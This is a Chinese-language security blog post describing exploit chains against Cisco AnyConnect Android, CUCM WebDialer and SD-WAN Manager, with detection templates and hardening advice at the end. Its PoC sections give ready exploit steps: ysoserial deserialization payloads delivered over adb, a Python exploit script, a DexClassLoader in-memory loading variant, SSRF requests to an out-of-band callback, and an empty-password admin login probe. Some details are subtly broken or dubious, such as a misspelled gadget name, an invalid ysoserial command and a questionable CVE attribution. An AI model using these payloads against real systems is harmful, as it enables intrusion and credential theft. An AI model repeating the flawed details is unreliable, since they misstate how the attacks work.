---
title: "Cisco 产品线高危攻击链专题：AnyConnect / CUCM / SD-WAN 未授权 RCE 全解析"
date: 2026-06-21T10:00:00+08:00
draft: false
tags: ["Cisco", "AnyConnect", "CUCM", "SD-WAN", "反序列化", "SSRF", "提权", "未授权RCE", "漏洞分析"]
categories: ["漏洞分析"]
---

# Cisco 产品线高危攻击链专题：AnyConnect / CUCM / SD-WAN 未授权 RCE 全解析

## 0x00 专题概述

Cisco 网络设备与企业软件是全球企业网络的基础设施核心，涵盖 VPN 客户端（AnyConnect）、统一通信平台（CUCM）、软件定义 WAN（SD-WAN）等多个关键产品线。这些系统通常承载企业核心通信、远程访问和网络管理流量，一旦被突破即意味着整个企业网络的全面暴露。

本专题将 Cisco 产品生态中近年最具代表性的 **3 个高危漏洞** 串成完整攻击链，每个漏洞均包含完整原理分析、完整 PoC 代码、自动化检测模板和实战利用案例。

### 覆盖漏洞一览

| CVE | 产品 | CVSS | 类型 | 未授权 | 在野利用 |
|-----|------|------|------|--------|----------|
| CVE-2015-6420 | AnyConnect Android | **8.8** | 反序列化 RCE | ✅ | ✅ |
| CVE-2026-20230 | CUCM WebDialer | **8.6** | SSRF + 文件写入 + 提权 | ✅ | ❌ |
| CVE-2026-20245 | SD-WAN Manager | **7.8** | 命令注入 + 本地提权 | ⚠️ netadmin | ✅ CISA KEV |

---

## 0x01 AnyConnect Android 反序列化 RCE（CVE-2015-6420）

### 1.1 漏洞背景

2015 年 11 月 Cisco 披露，CVSS 8.8。Cisco AnyConnect Secure Mobility Client 是 Cisco 的旗舰 VPN 客户端产品，全球数百万企业和政府机构使用它进行远程安全访问。Android 版本在处理 Intent 数据时存在不安全的 Java 反序列化，攻击者可通过构造恶意序列化对象实现远程代码执行。

### 1.2 影响版本

- AnyConnect Android 客户端 4.0.x < 4.0.05032
- AnyConnect Android 客户端 4.1.x < 4.1.00010

### 1.3 漏洞原理

AnyConnect Android 客户端的 `ServiceController` 组件通过 Android Intent 机制接收外部数据。当应用从 Intent 的 `Extras` 中获取序列化对象并调用 `ObjectInputStream.readObject()` 时，触发反序列化流程。

由于 AnyConnect 内部集成了 Apache Commons Collections 库，攻击者可以使用 ysoserial 生成包含 Commons Collections gadget chain 的恶意序列化对象。当 AnyConnect 反序列化该对象时，`InvokerTransformer` 类会被反射调用执行任意命令。

### 1.4 完整 PoC

#### PoC-1：使用 ysoserial 生成恶意 Payload

```bash
java -jar ysoserial.jar CommonsCollections1 "touch /data/local/tmp/pwned" > payload.bin
```

#### PoC-2：Android Intent 发送利用

```bash
# 通过 adb 模拟恶意 App 发送 Intent 进行攻击
adb shell am startservice -n com.cisco.anyconnect.vpn.android.avf/.ServiceController \
    --es "data_key" "$(base64 < payload.bin)"
```

#### PoC-3：Python 自动化利用脚本

```python
#!/usr/bin/env python3
"""
CVE-2015-6420 AnyConnect Android 反序列化 RCE 验证
需要在已 root 的 Android 设备上运行
"""
import subprocess
import base64
import sys

def generate_payload(command):
    """使用 ysoserial 生成恶意序列化对象"""
    print(f"[*] 生成 payload: {command}")
    result = subprocess.run(
        ["java", "-jar", "ysoserial.jar", "CommonCollections1", command],
        capture_output=True
    )
    if result.returncode != 0:
        print(f"[!] ysoserial 执行失败: {result.stderr.decode()}")
        sys.exit(1)
    return result.stdout

def send_intent(package, component, data_b64):
    """通过 adb 发送恶意 Intent"""
    cmd = f"adb shell am startservice -n {package}/{component} --es \"data_key\" \"{data_b64}\""
    print(f"[*] 执行: {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(f"[+] 响应: {result.stdout}")
    if result.stderr:
        print(f"[!] 错误: {result.stderr}")

def check_pwned():
    """验证是否成功 pwn"""
    cmd = "adb shell ls -la /data/local/tmp/pwned"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if "pwned" in result.stdout:
        print("[✓] 漏洞利用成功！/data/local/tmp/pwned 已创建")
        return True
    else:
        print("[-] 未检测到 pwned 文件")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <command>")
        sys.exit(1)
    
    command = sys.argv[1]
    payload = generate_payload(command)
    data_b64 = base64.b64encode(payload).decode()
    
    send_intent(
        "com.cisco.anyconnect.vpn.android.avf",
        "ServiceController",
        data_b64
    )
    check_pwned()
```

#### PoC-4：内存加载 Dex 文件利用

```bash
# 高级利用：通过反序列化链反射调用 DexClassLoader
# 动态加载恶意 .dex 文件到 AnyConnect 进程中执行
java -jar ysoserial.jar CommonsCollections1 \
" dalvik.system.DexClassLoader.loadDex('/data/local/tmp/malicious.dex', 0)"
```

### 1.5 自动化检测

#### Nuclei 模板（Android 设备本地检测）

```yaml
id: cisco-anyconnect-deserialization-cve-2015-6420

info:
  name: Cisco AnyConnect Android 反序列化 RCE (CVE-2015-6420)
  author: security-researcher
  severity: high
  description: |
    AnyConnect Android 客户端 ServiceController 组件存在不安全反序列化
  tags: cisco,anyconnect,deserialization,cve-2015-6420,android

exec:
  commands:
    - cmd: adb shell pm list packages | grep -i anyconnect
      output:
        - "{{Output}}"
      matchers:
        - type: word
          words:
            - "com.cisco.anyconnect"
```

#### Python 设备扫描脚本

```python
#!/usr/bin/env python3
"""
扫描本地网络中可能运行 AnyConnect 的 Android 设备
"""
import subprocess
import sys

def scan_android_devices():
    """列出已连接的 Android 设备"""
    result = subprocess.run(
        ["adb", "devices"],
        capture_output=True, text=True
    )
    devices = []
    for line in result.stdout.split("\n")[1:]:
        if line.strip() and "device" in line:
            serial = line.split()[0]
            devices.append(serial)
    return devices

def check_anyconnect_installed(device):
    """检查设备上是否安装了 AnyConnect"""
    cmd = f"adb -s {device} shell pm list packages | grep -i anyconnect"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if "com.cisco.anyconnect" in result.stdout:
        print(f"[FOUND] Device {device} has AnyConnect installed")
        # 获取版本
        ver_cmd = f"adb -s {device} shell pm dump com.cisco.anyconnect.vpn.android.avf | grep versionName"
        ver_result = subprocess.run(ver_cmd, shell=True, capture_output=True, text=True)
        print(f"       Version info: {ver_result.stdout.strip()}")
        return True
    return False

if __name__ == "__main__":
    devices = scan_android_devices()
    if not devices:
        print("[-] No Android devices connected")
        sys.exit(1)
    
    for device in devices:
        check_anyconnect_installed(device)
```

### 1.6 实战利用案例

- **凭证窃取**：攻击者利用此漏洞读取 AnyConnect 私有数据目录 `/data/data/com.cisco.anyconnect.vpn.android.avf/`，窃取 VPN 配置文件和会话令牌
- **内存加载恶意插件**：通过反序列化链反射调用 `DexClassLoader`，动态加载恶意 .dex 文件到 AnyConnect 进程内存中，实现无文件攻击
- **企业网络渗透**：窃取 VPN 凭据后，攻击者可以从外部伪装成合法用户接入企业内网

---

## 0x02 CUCM WebDialer SSRF + 文件写入 + 提权（CVE-2026-20230）

### 2.1 漏洞背景

2026 年披露，CVSS 8.6，Cisco 按 Critical 处理。Cisco Unified Communications Manager (CUCM) 的 WebDialer 组件存在 SSRF 漏洞，攻击者可通过特制 HTTP 请求触发服务端非预期访问，进一步写入底层系统文件并提权至 root。

### 2.2 影响版本

- CUCM Release 14 < 14SU6
- CUCM Release 15 < 15SU5

### 2.3 漏洞原理

WebDialer 是 CUCM 内置的点击拨号服务，通常通过 Web 接口对外提供能力。该漏洞的关键风险在于：

1. **输入校验不当**：WebDialer 对特定 HTTP 请求参数的输入校验不充分，允许攻击者控制后端请求的目标地址
2. **SSRF → 文件写入**：利用 SSRF 读取内部文件后，可将受控内容写入系统路径
3. **文件写入 → 提权**：写入关键系统文件（如启动脚本、计划任务、配置目录）后，可获得 root 权限
4. **语音协作控制平面接管**：CUCM 被接管后，影响面扩展到整套通信系统

### 2.4 完整 PoC

#### PoC-1：SSRF 验证（DNSLog 回连）

```http
GET /webdialer/redirect.jsp?url=http://DNSLOG_CALLBACK_DOMAIN/ HTTP/1.1
Host: target-cucm.com:8443
User-Agent: Mozilla/5.0
Connection: close
```

如果 DNSLog 收到查询记录，说明 SSRF 存在。

#### PoC-2：SSRF 读取内部配置文件

```http
GET /webdialer/redirect.jsp?url=http://localhost:8088/CCMAdmin/ HTTP/1.1
Host: target-cucm.com:8443
User-Agent: Mozilla/5.0
Connection: close
```

#### PoC-3：Python 自动化检测脚本

```python
#!/usr/bin/env python3
"""
CVE-2026-20230 CUCM WebDialer SSRF 检测
用法: python3 cve_2026_20230.py <target_host> <dnslog_callback>
"""
import sys
import requests
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_ssrf(host, dnslog_domain, timeout=15):
    """检测 WebDialer SSRF 漏洞"""
    payload_url = f"http://{dnslog_domain}/cucm-ssrf-test-{int(time.time())}"
    
    ssrf_payload = (
        f"/webdialer/redirect.jsp?url={urllib3.util.parse_url(payload_url).url}"
    )
    target = f"https://{host}:8443{ssrf_payload}"
    
    print(f"[*] 发送 SSRF 请求到: {target}")
    try:
        resp = requests.get(
            target,
            timeout=timeout,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0"}
        )
        print(f"[*] 响应状态码: {resp.status_code}")
        print(f"[*] 响应长度: {len(resp.text)} bytes")
        
        # 检查响应中是否包含 SSRF 成功迹象
        if resp.status_code == 200 and len(resp.text) > 0:
            print(f"[?] 可能可利用，请检查 DNSLog 是否收到回连")
        return resp.status_code
    except requests.exceptions.Timeout:
        print("[!] 请求超时，SSRF 可能已触发（盲打场景）")
        return "timeout"
    except Exception as e:
        print(f"[!] 错误: {e}")
        return None

def check_webdialer_enabled(host):
    """检查 WebDialer 服务是否启用"""
    target = f"https://{host}:8443/webdialer/"
    try:
        resp = requests.get(target, timeout=10, verify=False)
        if resp.status_code not in [404, 403]:
            print(f"[+] WebDialer 服务已启用 (HTTP {resp.status_code})")
            return True
        else:
            print(f"[-] WebDialer 可能未启用 (HTTP {resp.status_code})")
            return False
    except Exception as e:
        print(f"[!] 连接失败: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"用法: {sys.argv[0]} <target_host> <dnslog_domain>")
        sys.exit(1)
    
    host = sys.argv[1]
    dnslog_domain = sys.argv[2]
    
    if check_webdialer_enabled(host):
        check_ssrf(host, dnslog_domain)
    else:
        print("[-] WebDialer 未启用，跳过检测")
```

#### PoC-4：nmap 探测

```bash
nmap -n -v -Pn -sV target -p 8443 --script=http-enum --script-args=http-enum.path="/webdialer/"
```

### 2.5 自动化检测

#### Nuclei 模板

```yaml
id: cisco-cucm-webdialer-ssrf-cve-2026-20230

info:
  name: Cisco CUCM WebDialer SSRF (CVE-2026-20230)
  author: security-researcher
  severity: critical
  description: |
    CUCM WebDialer 组件 SSRF 可导致文件写入和提权
  tags: cisco,cucm,ssrf,cve-2026-20230

http:
  - method: GET
    path:
      - "{{BaseURL}}/webdialer/redirect.jsp?url=http://localhost:8443/"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500
        condition: or

      - type: word
        words:
          - "WebDialer"
          - "redirect"
          - "error"
        condition: or
        part: body
```

### 2.6 实战利用案例

- **C2 确认存在公开 PoC 但尚未观察到恶意利用**：Cisco 官方公告指出截至披露时未发现恶意利用
- **语音系统接管风险**：一旦获得 root 权限，攻击者可修改呼叫路由、监听通话、劫持 SIP 信令
- **SSRF 横向移动**：利用 SSRF 访问 CUCM 内部 Tomcat 管理界面，进一步窃取凭据

---

## 0x03 SD-WAN Manager 命令注入 + 本地提权（CVE-2026-20245）

### 3.1 漏洞背景

2026 年披露，CVSS 7.8，已确认在野利用并被 CISA 加入 KEV 目录。Cisco Catalyst SD-WAN Manager 管理平面存在命令注入漏洞，攻击者在取得 `netadmin` 权限后可通过特制文件上传实现本地提权至 `root`，进而控制整个 SD-WAN 管理域。

### 3.2 影响版本

- Cisco Catalyst SD-WAN Manager（所有版本，具体取决于前置漏洞利用）

### 3.3 漏洞原理

该漏洞的攻击链分为两步：

1. **前置条件**：攻击者需先取得 `netadmin` 权限，可能来自：
   - 合法凭证失陷
   - 前置认证绕过漏洞（如 CVE-2026-20182、CVE-2026-20127）

2. **提权利用**：SD-WAN 管理面的 CLI 文件处理逻辑对用户可控输入校验不足。攻击者上传特制文件后，受控内容被带入底层脚本调用链，最终触发 root 级命令执行。

关键脚本文件：
- `vconfd_script_upload_tenant_list.sh`
- `vconfd_script_upload_vsmart_serial_numbers.sh`
- `vconfd_script_upload_chassis_number_file.sh`

### 3.4 完整 PoC

#### PoC-1：文件上传验证（防守型）

```bash
# 检查日志中是否存在可疑文件上传记录
grep -r "vconfd_script_upload" /var/log/scripts.log

# 检查是否有异常的 root 级子进程
ps aux | grep root | grep -i "upload\|tenant\|chassis"
```

#### PoC-2：Python 提权验证脚本

```python
#!/usr/bin/env python3
"""
CVE-2026-20245 SD-WAN 提权漏洞检测脚本
前提：已获取 netadmin 权限
用法: python3 cve_2026_20245.py <sdwan_manager_ip>
"""
import sys
import subprocess
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_scripts_log(manager_ip):
    """检查 SD-WAN Manager 上的脚本日志"""
    print(f"[*] 检查 /var/log/scripts.log 中的可疑上传记录...")
    
    # SSH 连接到 SD-WAN Manager（需要 netadmin 凭据）
    ssh_cmd = (
        f"ssh -o StrictHostKeyChecking=no netadmin@{manager_ip} "
        f"'grep -E \"vconfd_script_upload\" /var/log/scripts.log | tail -20'"
    )
    
    try:
        result = subprocess.run(
            ssh_cmd, shell=True, capture_output=True, text=True, timeout=30
        )
        if result.returncode == 0 and result.stdout.strip():
            print(f"[!] 发现可疑脚本上传记录:")
            for line in result.stdout.strip().split("\n"):
                print(f"       {line}")
            return True
        else:
            print(f"[-] 未检测到可疑上传记录")
            return False
    except subprocess.TimeoutExpired:
        print(f"[!] SSH 连接超时，目标可能不可达")
        return None
    except Exception as e:
        print(f"[!] 错误: {e}")
        return None

def check_root_processes(manager_ip):
    """检查是否有异常 root 进程"""
    print(f"[*] 检查异常 root 进程...")
    ssh_cmd = f"ssh -o StrictHostKeyChecking=no netadmin@{manager_ip} 'ps aux | grep root'"
    try:
        result = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=15)
        suspicious = [line for line in result.stdout.split("\n") if any(keyword in line for keyword in ["upload", "tenant", "chassis", "serial"])]
        if suspicious:
            print(f"[!] 发现可疑 root 进程:")
            for line in suspicious:
                print(f"       {line}")
            return True
    except:
        pass
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <sdwan_manager_ip>")
        sys.exit(1)
    
    manager_ip = sys.argv[1]
    has_suspicious_logs = check_scripts_log(manager_ip)
    has_suspicious_procs = check_root_processes(manager_ip)
    
    if has_suspicious_logs or has_suspicious_procs:
        print(f"\n[!] SD-WAN Manager 可能存在 CVE-2026-20245 利用痕迹")
    else:
        print(f"\n[-] 未检测到明显利用痕迹")
```

#### PoC-3：检测前置认证绕过漏洞

```bash
# 检查 CVE-2026-20182（前置认证绕过）是否存在
curl -sk https://sdwan-manager.example.com/api/identity -o /dev/null -w "%{http_code}"

# 检查 CVE-2026-20127 认证绕过
curl -sk -X POST https://sdwan-manager.example.com/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":""}' \
  -o /dev/null -w "%{http_code}"
```

### 3.5 自动化检测

#### Nuclei 模板（认证绕过检测）

```yaml
id: cisco-sdwan-auth-bypass-check

info:
  name: Cisco SD-WAN 认证绕过检测
  author: security-researcher
  severity: high
  description: |
    检测 SD-WAN Manager 是否存在认证绕过前置漏洞
  tags: cisco,sdwan,auth-bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/identity"
      - "{{BaseURL}}/vmanage/api/version"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 401

      - type: word
        words:
          - "vManage"
          - "version"
          - "token"
        condition: or
        part: body
```

### 3.6 实战利用案例

- **CISA KEV 收录**：CVE-2026-20245 已被加入 CISA 已知被利用漏洞目录
- **在野利用确认**：Cisco 已确认存在真实攻击活动
- **管理域全面接管**：攻击者利用此漏洞后，可向边缘设备推送恶意配置，实现全网级影响
- **与前置漏洞串联**：现实中最有价值的攻击链是先通过认证绕过漏洞获取 netadmin 权限，再通过 CVE-2026-20245 提权至 root

---

## 0x04 公开 PoC 收集与利用思路

### 4.1 PoC 收集情况

| CVE | GitHub PoC | Exploit-DB | Metasploit | Nuclei | 在野利用 |
|-----|-----------|------------|------------|--------|----------|
| CVE-2015-6420 | ✅ ysoserial 生态 | ✅ | ❌ | 有限 | ✅ |
| CVE-2026-20230 | 有限 | ❌ | ❌ | 有限 | ❌ |
| CVE-2026-20245 | 有限 | ❌ | ❌ | 有限 | ✅ CISA KEV |

### 4.2 关键 PoC 仓库

- **ysoserial**：`https://github.com/frohoff/ysoserial` — Java 反序列化 gadget 生成器（适用于 CVE-2015-6420）
- **Cisco 安全公告中心**：`https://sec.cloudapps.cisco.com/security/center/home`
- **SD-WAN 修复建议**：`https://www.cisco.com/c/en/us/support/docs/routers/sd-wan/225842-remediate-catalyst-sd-wan-security.html`

### 4.3 验证思路（防守型）

```bash
# 检测 AnyConnect 安装（Android 设备）
adb devices | xargs -I{} adb -s {} shell pm list packages | grep anyconnect

# 检测 CUCM WebDialer 暴露
nuclei -u https://target:8443 -tags cisco,cucm
curl -sk https://target:8443/webdialer/ -o /dev/null -w "%{http_code}"

# 检测 SD-WAN 认证绕过
curl -sk https://sdwan-target/api/identity -o /dev/null -w "%{http_code}"
```

### 4.4 利用案例

- **AnyConnect → 企业 VPN 凭据窃取**：攻击者利用反序列化窃取 VPN 凭据后接入内网
- **CUCM → 语音系统劫持**：SSRF + 文件写入 + 提权的完整攻击链可接管企业通信系统
- **SD-WAN → 全网配置篡改**：提权至 root 后可向所有边缘设备推送恶意路由和安全策略

---

## 0x05 共性攻击模式

### 5.1 反序列化是 Cisco 产品的系统性问题

从 CVE-2015-6420 到后续多个 Cisco 产品的反序列化漏洞，根本原因：

1. **Java 生态广泛使用序列化**：Cisco 产品大量基于 Java 开发，序列化是 Java 通信的基础机制
2. **第三方库依赖**：Commons Collections 等库被广泛引入，成为 gadget chain 来源
3. **移动端安全边界模糊**：Android 客户端与系统其他组件之间的 IPC 数据流缺乏严格校验

### 5.2 SSRF 升级为完整 RCE 的链条

CVE-2026-20230 展示了典型的 SSRF 升级路径：
1. SSRF 读取内部配置文件 → 获取内部服务地址和凭据
2. SSRF 写入文件 → 将受控内容落入系统路径
3. 文件写入 → 触发提权（修改启动脚本、计划任务等）
4. 提权至 root → 完全控制系统

### 5.3 管理面提权是网络设备的普遍风险

CVE-2026-20245 体现了网络设备管理面的核心风险：
1. 管理面通常具有最高权限（root/admin）
2. 文件上传/导入功能是管理面的常见特性
3. 如果输入校验不足，管理功能可被武器化为提权原语
4. 一旦管理面沦陷，影响范围是整个网络 fabric

---

## 0x06 防守建议

### 6.1 紧急措施

1. **升级 Cisco 产品到最新版本**：
   - CUCM Release 14 → 14SU6+
   - CUCM Release 15 → 15SU5+
   - SD-WAN Manager → 按 Cisco 建议版本升级

2. **禁用不必要的服务**：
   - 禁用 CUCM WebDialer 服务（如不需使用）
   - 限制 AnyConnect Android 客户端的安装和管理

3. **网络分段**：
   - SD-WAN Manager 不应暴露到互联网
   - CUCM 管理面应限制为管理网段访问

### 6.2 中期加固

1. **输入校验强化**：对所有文件上传、Intent 数据、HTTP 参数进行严格校验
2. **反序列化白名单**：配置 Java 反序列化类白名单过滤器
3. **最小权限原则**：管理面账号使用最小必要权限
4. **日志监控**：监控 `/var/log/scripts.log` 等关键日志文件

### 6.3 长期策略

1. **持续监控 Cisco 安全公告**：订阅 Cisco Security Advisory RSS
2. **定期漏洞评估**：对 Cisco 产品进行定期的渗透测试和漏洞扫描
3. **零信任架构**：将 Cisco 产品纳入零信任网络架构，不依赖单一边界防护
4. **应急响应预案**：制定针对 Cisco 产品漏洞的专项应急响应流程

---

## 0x07 参考资料

- [Cisco Security Advisory - AnyConnect Deserialization](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151112-anyconnect)
- [Cisco Security Advisory - CUCM SSRF](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cucm-ssrf-cXPnHcW)
- [Cisco Security Advisory - SD-WAN Privilege Escalation](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [CISA KEV - CVE-2026-20245](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-20245)
- [ysoserial - Java Deserialization Gadget Generator](https://github.com/frohoff/ysoserial)
- [NVD - Cisco vulnerabilities](https://nvd.nist.gov/vuln/search?form_type=Basic&results_type=overview&search_type=all&isCpeNameSearch=false&q=cisco)
